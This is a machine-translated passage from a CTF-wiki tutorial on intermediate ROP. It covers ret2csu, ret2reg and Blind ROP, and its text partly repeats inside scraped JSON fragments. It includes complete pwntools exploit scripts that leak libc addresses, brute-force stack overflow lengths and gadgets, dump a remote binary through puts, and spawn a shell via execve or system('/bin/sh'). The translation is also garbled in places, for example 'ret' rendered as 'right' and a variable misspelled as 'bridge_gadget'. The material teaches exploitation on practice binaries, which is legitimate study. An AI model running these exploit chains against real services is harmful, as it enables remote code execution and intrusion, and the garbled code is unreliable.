0x0000000000400600 to 0x0000000000400609, we can assign r13 to rdx, r14 to rsi, and r15d to edi (note that although this is assigned edi, ** but the high 32 bits of rdi at this time The register value is 0 (self-tuning)**, so we can control the value of the rdi register, but only the lower 32 bits, and these three registers are the first three registers passed in the x64 function call. Also, if we can reasonably control r12 and rbx, then we can call the function we want to call. For example, we can control rbx to be 0, and r12 is the address of the function we want to call. - From 0x000000000040060D to 0x0000000000400614, we can control the relationship between rbx and rbp as rbx+1 = rbp, so we will not execute loc_400600, and we can continue to execute the following assembler. Here we can simply set rbx=0, rbp=1. ###example Here we take the steamed rice step by step to learn the level5 of the linux linux_x64 article as an example. First check the security of the program ```shell \u279c ret2__libc_csu_init git:(iromise) \u2717 checksec level5 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) The program is 64-bit and the stack unenforceable protection is turned on. Second, looking for bugs in the program, you can see that there is a simple stack overflow in the program. ssize_t vulnerable_function () { char buf ; // [sp+0h] [bp-80h]@1 return read ( 0 , & buf , 0x200uLL ); } A simple browsing of the program, found that the program has neither the system function address nor the /bin/sh string, so both of us need to construct ourselves. Note: Here I tried to use the system function to get the shell failed. It should be a problem with environment variables, so here is the execve to get the shell. Basic use ideas are as follows Execute libc_csu_gadgets with stack overflow to get the address of the write function and cause the program to re-execute the main function Get the corresponding libc version and execve function address according to libcsearcher Re-execute libc_csu_gadgets with stack overflow to write the execve address and the '/bin/sh' address to the bss section and cause the program to re-execute the main function. Execute libc_csu_gadgets again with stack overflow to execute execve('/bin/sh') to get the shell. Exp is as follows from pwn import * from LibcSearcher import LibcSearcher #context.log_level = 'debug' level5 = ELF ( & #39;./ level5&#39;) sh = process ( './level5' ) write_got = level5 . got [ 'write' ] read_got = level5 . got [ 'read' ] main_addr = level5 . symbols [ 'main' ] bss_base = level5 . bss () csu_front_addr = 0x0000000000400600 csu_end_addr = 0x000000000040061A fakeebp = 'b' * 8 def csu ( rbx , rbp , r12 , r13 , r14 , r15 , last ): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi = ID = r15d # rsi = r14 # rdx=r13 payload = 'a' * 0x80 + fakeebp payload += p64 ( csu_end_addr ) + p64 ( rbx ) + p64 ( rbp ) + p64 ( r12 ) + p64 ( r13 ) + p64 ( r14 ) + p64 ( r15 ) payload += p64 ( csu_front_addr ) payload += 'a' * 0x38 payload += p64 ( last ) sh . send ( payload ) sleep ( 1 ) sh . recvuntil ( 'Hello, World \\n ' ) ## RDI, RSI, RDX, RCX, R8, R9, more on the stack ## write(1,write_got,8) csu ( 0 , 1 , write_got , 8 , write_got , 1 , main_addr ) write_addr = u64 ( sh . recv ( 8 )) libc = LibcSearcher ( 'write' , write_addr ) libc_base = write_addr - libc . dump ( 'write' ) execve_addr = libc_base + libc . dump ( 'execve' ) log . success ( 'execve_addr ' + hex ( execve_addr )) ##gdb.attach(sh) ## read(0,bss_base,16) ## read execve_addr and /bin/sh\\x00 sh . recvuntil ( 'Hello, World \\n ' ) csu ( 0 , 1 , read_got , 16 , bss_base , 0 , main_addr ) sh . send ( p64 ( execve_addr ) + '/bin/sh \\x00 ' ) sh . recvuntil ( 'Hello, World \\n ' ) ## execve(bss_base+8) csu ( 0 , 1 , bss_base , 0 , 0 , bss_base + 8 , main_addr ) sh . interactive () Thinking \u00b6 Improve \u00b6 In the above, we directly used this generic gadgets with a byte length of 128. However, not all bugs allow us to enter such long bytes. So what do we do when we allow a small number of bytes to enter? Here are a few methods Improve 1 - Control rbx and rbp in advance \u00b6 It can be seen that in our previous utilization, we used the values of these two registers mainly to satisfy the condition of cmp and jump. If we can control these two values in advance, then we can reduce 16 bytes, that is, we need only 112 for the number of bytes we need. Improvement 2-Multiple use \u00b6 In fact, improvement 1 is also a multi-use. We can see that our gadgets are divided into two parts, so we can actually make two calls to achieve the purpose, in order to reduce the number of bytes required for a gadget. But the multiple uses here require more stringent conditions. Vulnerabilities can be triggered multiple times The program has not modified the r12-r15 register between triggers because it is called twice. Of course, sometimes we will encounter a large number of bytes that can be read in one time, but the vulnerability is not allowed to be reused. At this time, we need to arrange all the bytes at once and then use it slowly. gadget \u00b6 In fact, in addition to the above gadgets, gcc will compile some other functions by default. _init _start call_gmon_start deregister_tm_clones register_tm_clones __do_global_dtors_aux frame_dummy __libc_csu_init __libc_csu_fini _fini We can also try to use some of the code to perform. In addition, since the PC itself simply passes the data at the execution address of the program to the CPU, the CPU simply decodes the transferred data, and as long as the decoding is successful, it is executed. So we can offset some of the addresses in the source program to get the instructions we want, as long as we can ensure that the program does not crash. Need to say that in the above libc_csu_init we mainly use the following registers Control rbx, rbp, r12, r13, r14, r15 with the tail code. Control rdx, rsi, edi with the code in the middle section. In fact, the tail of libc_csu_init can control other registers by offset. Among them, 0x000000000040061A is the normal starting address, can see that we can control the rbp register at 0x000000000040061f, and can control the rsi register at 0x0000000000400621. And if you want to understand this part in depth, you need to have a more thorough understanding of each field in the assembly instructions. as follows. ` asm gef\u27a4 x/5i 0x000000000040061A 0x40061a <__libc_csu_init+90>: pop rbx 0x40061b <__libc_csu_init+91>: pop rbp 0x40061c <__libc_csu_init+92>: pop r12 0x40061e <__libc_csu_init+94>: pop r13 0x400620 <__libc_csu_init+96>: pop r14 gef\u27a4 x/5i 0x000000000040061b 0x40061b <__libc_csu_init+91>: pop rbp 0x40061c <__libc_csu_init+92>: pop r12 0x40061e <__libc_csu_init+94>: pop r13 0x400620 <__libc_csu_init+96>: pop r14 0x400622 <__libc_csu_init+98>: pop r15 gef\u27a4 x/5i 0x000000000040061A+3 0x40061d <__libc_csu_init+93>: pop rsp 0x40061e <__libc_csu_init+94>: pop r13 0x400620 <__libc_csu_init+96>: pop r14 0x400622 <__libc_csu_init+98>: pop r15 0x400624 <__ libc_csu_init + 100>: right gef\u27a4 x/5i 0x000000000040061e 0x40061e <__libc_csu_init+94>: pop r13 0x400620 <__libc_csu_init+96>: pop r14 0x400622 <__libc_csu_init+98>: pop r15 0x400624 <__ libc_csu_init + 100>: right 0x400625: nop gef\u27a4 x/5i 0x000000000040061f 0x40061f <__libc_csu_init+95>: pop rbp 0x400620 <__libc_csu_init+96>: pop r14 0x400622 <__libc_csu_init+98>: pop r15 0x400624 <__ libc_csu_init + 100>: right 0x400625: nop gef\u27a4 x/5i 0x0000000000400620 0x400620 <__libc_csu_init+96>: pop r14 0x400622 <__libc_csu_init+98>: pop r15 0x400624 <__ libc_csu_init + 100>: right 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0] gef\u27a4 x/5i 0x0000000000400621 0x400621 <__libc_csu_init+97>: pop rsi 0x400622 <__libc_csu_init+98>: pop r15 0x400624 <__ libc_csu_init + 100>: right 0x400625: nop gef\u27a4 x/5i 0x000000000040061A+9 0x400623 <__libc_csu_init+99>: pop rdi 0x400624 <__ libc_csu_init + 100>: right 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0] 0x400630 <__libc_csu_fini>: repz ret ### Title - 2016 XDCTF pwn100 - 2016 Huashan Cup SU_PWN ### Reference reading - http://wooyun.jozxing.cc/static/drops/papers-7551.html - http://wooyun.jozxing.cc/static/drops/binary-10638.html ## ret2reg ### Principle 1. Check which register value points to the overflow buffer space when the overflow function returns. 2. Then decompile the binary, look for the call reg or jmp reg command, and set the EIP to the instruction address. 3. Inject the shellcode into the space pointed to by reg (you need to make sure that the space is executable, but it is usually on the stack) ## BROP ### basic introduction BROP (Blind ROP) was presented by Andrea Bittau of Standford in 2014. The relevant research results were published in Oakland 2014. The title of the paper is **Hacking Blind**. The following is the author&#39;s corresponding paper and slides, and the author&#39;s corresponding introduction. - [paper] (http://www.scs.stanford.edu/brop/bittau-brop.pdf) - [slide] (http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf) BROP is an execution flow that hijacks a program without attacking the program under the source code or binary file of the corresponding application. ### Attack conditions 1. The source program must have a stack overflow vulnerability so that an attacker can control the program flow. 2. The server-side process restarts after a crash, and the restarted process has the same address as the previous address (that is, even if the program has ASLR protection, it only works when the program is initially started). Currently, server applications such as nginx, MySQL, Apache, and OpenSSH are compatible with this feature. ### Attack principle Currently, most applications will open ASLR, NX, Canary protection. Here we explain how to bypass these protections in BROP and how to attack them. #### The basic idea In BROP, the basic following ideas are as follows - Determine the stack overflow length - Violent enumeration - Stack Reading - Get data on the stack to leak canaries, as well as ebp and return address. - Blind ROP - Find enough gadgets to control the parameters of the output function and call them, such as the common write function and the puts function. - Build the exploit - Use the output function to dump the program so that you can find more gadgets so you can write the final exploit. #### Stack overflow length You can enumerate directly from 1 violence until you find the program crashes. #### Stack Reading As shown below, this is the current classic stack layout buffer|canary|saved fame pointer|saved returned address To get the canary and the variables that follow, we need to solve the first problem, how to get the length of the overflow, which can be obtained by continuous trial. Secondly, regarding the canary and the following variables, the method used is the same. Here we take canary as an example. Canary itself can be obtained by blasting, but it is obviously inefficient if you just enumerate all the values stupidly. It should be noted that the attack condition 2 indicates that the program itself does not change because of the crash, so the canary equivalent is the same each time. So we can blast by byte. As the paper shows, there are up to 256 possibilities per byte, so in the case of 32 bits, we need to blast up to 1024 times, and 64 bits can blast up to 2048 times. ![](./figure/stack_reading.png) #### Blind ROP ##### The basic idea The simplest way to execute the write function is to construct a system call. `` `asm pop rdi; right # socket pop rsi; ret # buffer pop rdx; ret # length pop rax; ret # write syscall number syscall But in general, such an approach is more difficult, because it is basically impossible to find a syscall address. . . We can get it by converting to find the way to write. BROP gadgets \u00b6 First, at the end of libc_csu_init, a long list of gadgets, we can get the first two parameters of the write function call by offset. As shown in the text find a call write \u00b6 We can get the address of the write through the plt table. control rdx \u00b6 It should be noted that rdx is just a variable we use to output the length of the program byte, as long as it is not 0. Generally speaking, the rdx in the program will not be zero. But in order to better control the program output, we still try to control this value. But in the program ` asm pop rdx; ret There are almost no such instructions. So how do we control the value of rdx? Here we need to explain that when strcmp is executed, rdx will be set to the length of the string to be compared, so we can find the strcmp function to control rdx. Then the next question, we can be divided into two Find gadgets Find a PLT form - write entry - strcmp entry ##### Looking for gadgets First, let&#39;s find a way to find gadgets. At this point, since we don&#39;t know what the program looks like, we can only guess the corresponding gadgets by simply setting the return address of the program to its own value. When we control the return address of the program, there are generally the following situations: - The program crashes directly - The program crashes after running for a while - The program keeps running without crashing In order to find reasonable gadgets, we can divide into the following two steps. ###### Looking for stop gadgets The so-called &quot;stop gadget&quot; generally refers to such a piece of code: when the program executes this code, the program will enter an infinite loop, so that the attacker can remain connected. &gt; In fact, the stop gadget does not have to be the same as above. Its basic purpose is to tell the attacker that the return address tested is a gadgets. The reason for finding stop gadgets is that when we guess a gadgtes, if we just lay it on the stack, the program will jump to the next address on the stack after executing the gadget. If the address is an illegal address, the program will crash. In this case, the attacker seems to be a simple crash. Therefore, the attacker would think that he did not execute any `useful gadget` in the process and gave up. The example is as follows ![](./figure/stop_gadget.png) However, if we have a `stop gadget`, then for every address we want to try, if it is a gadget, then the program won&#39;t crash. Next, just think of ways to identify these gadgets. ###### Identifying gadgets So how do we identify these gadgets? We can identify by stack layout and the behavior of the program. For easier introduction, here are the three addresses on the stack. - **Probe** - Probe, which is the code address we want to probe. In general, all 64-bit programs can be tried directly from 0x400000. If it is not successful, it is possible that the program has PIE protection enabled. If it is not good, it may be that the program is 32-bit. . I haven&#39;t really wanted to understand here, how can I quickly determine the number of remote bits. - **Stop** - The address of the stop gadget that will not crash the program. - **Trap** - an address that can cause the program to crash We can identify the instruction being executed by placing **Stop** and **Trap** in different orders on the stack. Because executing Stop means the program won&#39;t crash, executing Trap means the program will crash immediately. Here are a few examples - probe,stop,traps(traps,traps,...) - We can find a gadget that does not pop the stack, such as if the program crashes or not (** if the program crashes directly at the probe) - right - xor eax,eax; ret - probe,trap,stop,traps - We can find a gadget that just pops up a stack variable through such a layout. Such as - pop rax; right - pop rdi; right - probe, trap, trap, trap, trap, trap, trap, stop, traps - We can use this layout to find a gadget that pops up 6 stack variables, which is a gadget similar to a brop gadget. **There is a problem with the original text. For example, if you encounter an address that just pops a stack variable, it will not crash. **In general, you will encounter two interesting places. - plt will not collapse, - _start will not collapse, which is equivalent to re-execution of the program. The reason for putting a trap behind each layout is to be able to recognize that when the instruction executed at the corresponding address of our probe skips the stop, the program crashes immediately. However, even then, it is still difficult to identify which register the given gadget is operating on. However, it is important to note that the 6 registers of gadgets are popped up to the BROP, which is not often seen in the program. So, if we find such gadgets, then there is a great possibility that this gadgets are brop gadgets. In addition, this gadgets can also generate gadgets such as pop rsp by misplacement, which can make the program crash as a sign to identify this gadgets. In addition, according to our previous ret2libc_csu_init, we can know that the address minus 0x1a will get its previous gadgets. Can be used to call other functions. Need to pay attention to is that the probe may be a stop gadget, we have to check it, how to check it? We just need to make all the content behind it a trap address. Because if it is a stop gadget, the program will execute normally, otherwise it will crash. It seems very interesting. ##### Looking for PLT As shown in the following figure, the plt table of the program has a relatively regular structure, and each plt entry is 16 bytes. Moreover, at the 6-byte offset of each entry, it is the parsing path of the function corresponding to the entry, that is, when the program first executes the function, the path is executed to parse the function&#39;s got address. ![](./figure/brop_plt.png) In addition, for most plt calls, it is generally not easy to crash, even with strange parameters. So, if we find a series of code segments of length 16 that don&#39;t crash the program, then we have some reason to believe that we have encountered a plt table. In addition, we can also determine whether we are in the middle of the plt entry or at the beginning by offsetting 6 bytes before and after. ##### Control rdx When we find the plt table, below, we should find a way to control the value of rdx, then how to confirm the location of strcmp? Need to say in advance that not all programs will call the strcmp function, so without calling the strcmp function, we have to use other methods to control the value of rdx. Here is the case where the strcmp function is used in the program. Previously, we have found the gadgets for brop, so we can control the first two parameters of the function. At the same time, we define the following two addresses - readable, readable address. - bad, illegal address, not accessible, say 0x0. Then if we control the parameters passed as a combination of these two addresses, the following four situations will occur. - strcmp(bad,bad) - strcmp(bad,readable) - strcmp(readable,bad) - strcmp(readable,readable) Only the last format will the program execute normally. **Note**: In the absence of PIE protection, the 64-bit program&#39;s ELF file has 7 non-zero bytes at 0x400000. So how do we do it specifically? One straightforward method is to scan each plt entry from start to finish, but this is more troublesome. We can choose one of the following methods - Slow path using plt entries - and use the address of the slow path of the next entry to override the return address In this way, we do not have to control the corresponding variables back and forth. Of course, we may also happen to find the strncmp or strcasecmp functions, which have the same effect as strcmp. ##### Looking for output functions Look for the output function to find both write and puts. Generally look for the puts function now. However, for the convenience of introduction, first introduce how to find write. ###### Looking for write@plt When we can control the three parameters of the write function, we can traverse all the plt tables again, and find the corresponding function according to the output of the write function. It should be noted that one of the more troublesome things here is that we need to find the value of the file descriptor. In general, we have two ways to find this value. - Use rop chain, and make the file descriptors corresponding to each rop different - Open multiple connections at the same time, and we use a relatively high number to try. have to be aware of is - By default, a process can only open up to 1024 file descriptors. - The posix standard file descriptor value per application is always the current minimum available value. Of course, we can also choose to look for the puts function. ###### Looking for puts@plt Looking for the puts function (here we are looking for plt), we naturally need to control the rdi parameters. Above, we have found the brop gadget. Then, we can get the corresponding gadgets according to the brop gadget offset 9 (followed by ret2libc_csu_init). At the same time, in the case that the program has not yet turned on PIE protection, 0x400000 is the head of the ELF file, and its content is \\x7fELF. So we can judge based on this. In general, its payload is as follows payload = 'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget) #### Attack Summary At this point, the attacker can already control the output function, so the attacker can output more content of the .text section in order to find more suitable gadgets. At the same time, the attacker can also find some other functions, such as dup2 or execve functions. Generally, the attacker will do the next thing at this time. - Redirect socket output to input and output - Look for the address of &quot;/bin/sh&quot;. In general, it is best to find a writable memory and use the write function to write the string to the appropriate address. - Execve the execve to get the shell, and the execve is not necessarily in the plt table. At this point, the attacker needs to find a way to execute the system call. ### Examples Here we take [HCTF2016&#39;s issuer missing] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/brop/hctf2016-brop) as an example. The basic idea is as follows #### Determine stack overflow length ```python def getbufferflow_length(): i = 1 while 1: try: sh = remote('127.0.0.1', 9999) sh.recvuntil('WelCome my friend,Do you know password?\\n') sh.send(i * 'a') output = sh.recv() sh.close() if not output.startswith('No password'): return i - 1 else: i += 1 except EOFError: sh.close() return i - 1 Based on the above, we can determine that the length of the stack overflow is 72. At the same time, according to the echo information, it can be found that the program does not open canary protection, otherwise, there will be corresponding error content. So we don't need to perform stack reading. Looking for stop gadgets \u00b6 The search process is as follows def get_stop_addr ( length ): addr = 0x400000 while 1 : try : sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'password? \\n ' ) payload = 'a' * length + p64 ( addr ) sh . sendline ( payload ) sh . recv () sh . close () print 'one success addr: 0x %x ' % ( addr ) return addr except Exception : addr += 1 sh . close () Here we directly try 64-bit programs without PIE, because it is generally like this, if it is turned on, then follow the open method, and found a lot, I chose a seemingly return Address to the source program one success stop gadget addr: 0x4006b6 Identifying brop gadgets \u00b6 Below, we get the corresponding brop gadgets address according to the principle described above. Constructed as follows, get_brop_gadget is to get a possible brop gadget, the latter check_brop_gadget is for checking. def get_brop_gadget ( length , stop_gadget , addr ): try : sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'password? \\n ' ) payload = 'a' * length + p64 ( addr ) + p64 ( 0 ) * 6 + p64 ( stop_gadget ) + p64 ( 0 ) * 10 sh . sendline ( payload ) content = sh . recv () sh . close () print content # stop gadget returns memory if not content . startswith ( 'WelCome' ): return False return True except Exception : sh . close () return False def check_brop_gadget ( length , addr ): try : sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'password? \\n ' ) payload = 'a' * length + p64 ( addr ) + 'a' * 8 * 10 sh . sendline ( payload ) content = sh . recv () sh . close () return False except Exception : sh . close () return True ##length = getbufferflow_length() length = 72 ##get_stop_addr(length) stop_gadget = 0x4006b6 addr = 0x400740 while 1 : print hex ( addr ) if get_brop_gadget ( length , stop_gadget , addr ): print 'possible brop gadget: 0x %x ' % addr if check_brop_gadget ( length , addr ): print 'success brop gadget: 0x %x ' % addr break addr += 1 In this way, we basically got the bopp gadgets address 0x4007ba Determine the puts@plt address \u00b6 According to the above, we can construct the following payload to get the acquisition. payload = 'A'*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget) The specific function is as follows def get_puts_addr ( length , rdi_ret , stop_gadget ): addr = 0x400000 while 1 : print hex ( addr ) sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'password? \\n ' ) payload = 'A' * length + p64 ( rdi_ret ) + p64 ( 0x400000 ) + p64 ( addr ) + p64 ( stop_gadget ) sh . sendline ( payload ) try : content = sh . recv () if content . startswith ( ' \\x7f ELF' ): print 'find puts@plt addr: 0x %x ' % addr return addr sh . close () addr += 1 except Exception : sh . close () addr += 1 Finally, according to the structure of plt, choose 0x400560 as puts@plt Leaking puts@got address \u00b6 After we can call the puts function, we can leak the address of the puts function, and then get the libc version, so as to get the relevant system function address and /bin/sh address to get the shell. We leaked 0x1000 bytes from 0x400000, which is enough to contain the plt part of the program. code show as below def leak ( length , rdi_ret , puts_plt , leak_addr , stop_gadget ): sh = remote ( '127.0.0.1' , 9999 ) payload = 'a' * length + p64 ( rdi_ret ) + p64 ( leak_addr ) + p64 ( puts_plt ) + p64 ( stop_gadget ) sh . recvuntil ( 'password? \\n ' ) sh . sendline ( payload ) try : data = sh . recv () sh . close () try : data = data [: data . index ( \" \\n WelCome\" )] except Exception : date = data if data == \"\" : data = ' \\x00 ' return data except Exception : sh . close () return None ##length = getbufferflow_length() length = 72 ##stop_gadget = get_stop_addr(length) stop_gadget = 0x4006b6 ## brop_gadget = find_brop_gadget (length, stop_gadget) brop_gadget = 0x4007ba rdi_ret = bridge_gadget + 9 ##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget) puts_plt = 0x400560 addr = 0x400000 result = \"\" while addr < 0x401000 : print hex ( addr ) data = leak ( length , rdi_ret , puts_plt , addr , stop_gadget ) if data is None : continue else : result += data addr + = len ( data ) with open ( 'code' , 'wb' ) as f : f . write ( result ) Finally, we write the leaked content to a file. It should be noted that if the leak is \"\", then we have encountered '\\x00', because puts is the output string, the string is terminated with '\\x00'. Then use ida to open the binary mode, first change the base address of the program to 0x400000 in edit->segments->rebase program, and then find the offset 0x560, as follows ` asm seg000: 0000000000400560 db 0FFh seg000: 0000000000400561 pcs 25h; % seg000: 0000000000400562 db 0B2h; seg000: 0000000000400563 db 0Ah seg000:0000000000400564 db 20h seg000: 0000000000400565 db 0 Then press c to convert the data here into assembly instructions as follows `` `asm seg000: 0000000000400560; -------------------------------------------------- ------------------------- seg000: 0000000000400560 jmp qword for cs: 601018h seg000: 0000000000400566; -------------------------------------------------- ------------------------- seg000:0000000000400566 push 0 seg000:000000000040056B jmp loc_400550 seg000:000000000040056B ; --------------------------------------------------------------------------- This shows that the address of puts@got is 0x601018. Program Utilization \u00b6 ##length = getbufferflow_length() length = 72 ##stop_gadget = get_stop_addr(length) stop_gadget = 0x4006b6 ## brop_gadget = find_brop_gadget (length, stop_gadget) brop_gadget = 0x4007ba rdi_ret = bridge_gadget + 9 ##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget) puts_plt = 0x400560 ##leakfunction(length, rdi_ret, puts_plt, stop_gadget) puts_got = 0x601018 sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'password? \\n ' ) payload = 'a' * length + p64 ( rdi_ret ) + p64 ( puts_got ) + p64 ( puts_plt ) + p64 ( stop_gadget ) sh . sendline ( payload ) data = sh . recvuntil ( ' \\n WelCome' , drop = True ) puts_addr = u64 ( data . ljust ( 8 , & #39;x00&#39;)) libc = LibcSearcher ( 'puts' , puts_addr ) libc_base = puts_addr - libc . dump ( 'puts' ) system_addr = libc_base + libc . dump ( 'system' ) binsh_addr = libc_base + libc . dump ( 'str_bin_sh' ) payload = 'a' * length + p64 ( rdi_ret ) + p64 ( binsh_addr ) + p64 ( system_addr ) + p64 ( stop_gadget ) sh . sendline ( payload ) sh . interactive () Reference reading \u00b6 http://ytliu.info/blog/2014/09/28/blind-return-oriented-programming-brop-attack-gong-ji-yuan-li/ http://bobao.360.cn/learning/detail/3694.html http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/","title":"Intermediate ROP"},{"location":"pwn/linux/stackoverflow/medium-rop/#rop","text":"The intermediate ROP mainly uses some clever Gadgets.","title":"\u4e2d\u7ea7ROP"},{"location":"pwn/linux/stackoverflow/medium-rop/#ret2csu","text":"","title":"ret2csu"},{"location":"pwn/linux/stackoverflow/medium-rop/#principle","text":"In 64-bit programs, the first six arguments to a function are passed through registers, but most of the time, it's hard to find the gadgets for each register. At this time, we can take advantage of the gadgets in __libc_csu_init under x64. This function is used to initialize libc, and the general program will call the libc function, so this function will exist. Let's take a look at this function first (of course, there are some differences between different versions of this function) ` asm .text:00000000004005C0 ; void _libc_csu_init(void) .text:00000000004005C0 public __libc_csu_init .text:00000000004005C0 __libc_csu_init proc near ; DATA XREF: _start+16\u0018o .text:00000000004005C0 push r15 .text:00000000004005C2 push r14 .text: 00000000004005C4 mov r15d, edi .text:00000000004005C7 push r13 .text:00000000004005C9 push r12 .text:00000000004005CB lea r12, __frame_dummy_init_array_entry .text:00000000004005D2 push rbp .text: 00000000004005D3 lea rbp, __do_global_dtors_to_final_array_entry .text:00000000004005DA push rbx .text:00000000004005DB mov r14, rsi .text:00000000004005DE mov r13, rdx .text:00000000004005E1 sub rbp, r12 .text:00000000004005E4 sub rsp, 8 .text: 00000000004005E8 sar rbp, 3 .text:00000000004005EC call _init_proc .text:00000000004005F1 test rbp, rbp .text:00000000004005F4 jz short loc_400616 .text:00000000004005F6 xor ebx, ebx .text:00000000004005F8 nop dword ptr [rax+rax+00000000h] .text:0000000000400600 .text:0000000000400600 loc_400600: ; CODE XREF: __libc_csu_init+54\u0019j .text:0000000000400600 mov rdx, r13 .text:0000000000400603 mov rsi, r14 .text: 0000000000400606 mov, r15d .text:0000000000400609 call qword ptr [r12+rbx*8] .text:000000000040060D add rbx, 1 .text:0000000000400611 cmp rbx, rbp .text:0000000000400614 jnz short loc_400600 .text:0000000000400616 .text:0000000000400616 loc_400616: ; CODE XREF: __libc_csu_init+34\u0018j .text:0000000000400616 add rsp, 8 .text:000000000040061A pop rbx .text:000000000040061B pop rbp .text:000000000040061C pop r12 .text:000000000040061E pop r13 .text:0000000000400620 pop r14 .text:0000000000400622 pop r15 .text: 0000000000400624 retn .text:0000000000400624 __libc_csu_init endp Here we can use the following points - From 0x000000000040061A to the end, we can use the stack overflow to construct data on the stack to control the data in the rbx, rbp, r12, r13, r14, r15 registers. - From 0x0000000000400600 to 0x0000000000400609, we can assign r13 to rdx, r14 to rsi, and r15d to edi (note that although this is assigned edi, ** but the high 32 bits of rdi at this time The register value is 0 (self-tuning)**, so we can control the value of the rdi register, but only the lower 32 bits, and these three registers are the first three registers passed in the x64 function call. Also, if we can reasonably control r12 and rbx, then we can call the function we want to call. For example, we can control rbx to be 0, and r12 is the address of the function we want to call. - From 0x000000000040060D to 0x0000000000400614, we can control the relationship between rbx and rbp as rbx+1 = rbp, so we will not execute loc_400600, and we can continue to execute the following assembler. Here we can simply set rbx=0, rbp=1. ###example Here we take the steamed rice step by step to learn the level5 of the linux linux_x64 article as an example. First check the security of the program ```shell \u279c ret2__libc_csu_init git:(iromise) \u2717 checksec level5 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) The program is 64-bit and the stack unenforceable protection is turned on. Second, looking for bugs in the program, you can see that there is a simple stack overflow in the program. ssize_t vulnerable_function () { char buf ; // [sp+0h] [bp-80h]@1 return read ( 0 , & buf , 0x200uLL ); } A simple browsing of the program, found that the program has neither the system function address nor the /bin/sh string, so both of us need to construct ourselves. Note: Here I tried to use the system function to get the shell failed. It should be a problem with environment variables, so here is the execve to get the shell. Basic use ideas are as follows Execute libc_csu_gadgets with stack overflow to get the address of the write function and cause the program to re-execute the main function Get the corresponding libc version and execve function address according to libcsearcher Re-execute libc_csu_gadgets with stack overflow to write the execve address and the '/bin/sh' address to the bss section and cause the program to re-execute the main function. Execute libc_csu_gadgets again with stack overflow to execute execve('/bin/sh') to get the shell. Exp is as follows from pwn import * from LibcSearcher import LibcSearcher #context.log_level = 'debug' level5 = ELF ( & #39;./ level5&#39;) sh = process ( './level5' ) write_got = level5 . got [ 'write' ] read_got = level5 . got [ 'read' ] main_addr = level5 . symbols [ 'main' ] bss_base = level5 . bss () csu_front_addr = 0x0000000000400600 csu_end_addr = 0x000000000040061A fakeebp = 'b' * 8 def csu ( rbx , rbp , r12 , r13 , r14 , r15 , last ): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi = ID = r15d # rsi = r14 # rdx=r13 payload = 'a' * 0x80 + fakeebp payload += p64 ( csu_end_addr ) + p64 ( rbx ) + p64 ( rbp ) + p64 ( r12 ) + p64 ( r13 ) + p64 ( r14 ) + p64 ( r15 ) payload += p64 ( csu_front_addr ) payload += 'a' * 0x38 payload += p64 ( last ) sh . send ( payload ) sleep ( 1 ) sh . recvuntil ( 'Hello, World \\n ' ) ## RDI, RSI, RDX, RCX, R8, R9, more on the stack ## write(1,write_got,8) csu ( 0 , 1 , write_got , 8 , write_got , 1 , main_addr ) write_addr = u64 ( sh . recv ( 8 )) libc = LibcSearcher ( 'write' , write_addr ) libc_base = write_addr - libc . dump ( 'write' ) execve_addr = libc_base + libc . dump ( 'execve' ) log . success ( 'execve_addr ' + hex ( execve_addr )) ##gdb.attach(sh) ## read(0,bss_base,16) ## read execve_addr and /bin/sh\\x00 sh . recvuntil ( 'Hello, World \\n ' ) csu ( 0 , 1 , read_got , 16 , bss_base , 0 , main_addr ) sh . send ( p64 ( execve_addr ) + '/bin/sh \\x00 ' ) sh . recvuntil ( 'Hello, World \\n ' ) ## execve(bss_base+8) csu ( 0 , 1 , bss_base , 0 , 0 , bss_base + 8 , main_addr ) sh . interactive ()","title":"Principle"},{"location":"pwn/linux/stackoverflow/medium-rop/#thinking","text":"","title":"Thinking"},{"location":"pwn/linux/stackoverflow/medium-rop/#improve","text":"In the above, we directly used this generic gadgets with a byte length of 128. However, not all bugs allow us to enter such long bytes. So what do we do when we allow a small number of bytes to enter? Here are a few methods","title":"Improve"},{"location":"pwn/linux/stackoverflow/medium-rop/#improve-1-control-rbx-and-rbp-in-advance","text":"It can be seen that in our previous utilization, we used the values of these two registers mainly to satisfy the condition of cmp and jump. If we can control these two values in advance, then we can reduce 16 bytes, that is, we need only 112 for the number of bytes we need.","title":"Improve 1 - Control rbx and rbp in advance"},{"location":"pwn/linux/stackoverflow/medium-rop/#improvement-2-multiple-use","text":"In fact, improvement 1 is also a multi-use. We can see that our gadgets are divided into two parts, so we can actually make two calls to achieve the purpose, in order to reduce the number of bytes required for a gadget. But the multiple uses here require more stringent conditions. Vulnerabilities can be triggered multiple times The program has not modified the r12-r15 register between triggers because it is called twice. Of course, sometimes we will encounter a large number of bytes that can be read in one time, but the vulnerability is not allowed to be reused. At this time, we need to arrange all the bytes at once and then use it slowly.","title":"Improvement 2-Multiple use"},{"location":"pwn/linux/stackoverflow/medium-rop/#gadget","text":"In fact, in addition to the above gadgets, gcc will compile some other functions by default. _init _start call_gmon_start deregister_tm_clones register_tm_clones __do_global_dtors_aux frame_dummy __libc_csu_init __libc_csu_fini _fini We can also try to use some of the code to perform. In addition, since the PC itself simply passes the data at the execution address of the program to the CPU, the CPU simply decodes the transferred data, and as long as the decoding is successful, it is executed. So we can offset some of the addresses in the source program to get the instructions we want, as long as we can ensure that the program does not crash. Need to say that in the above libc_csu_init we mainly use the following registers Control rbx, rbp, r12, r13, r14, r15 with 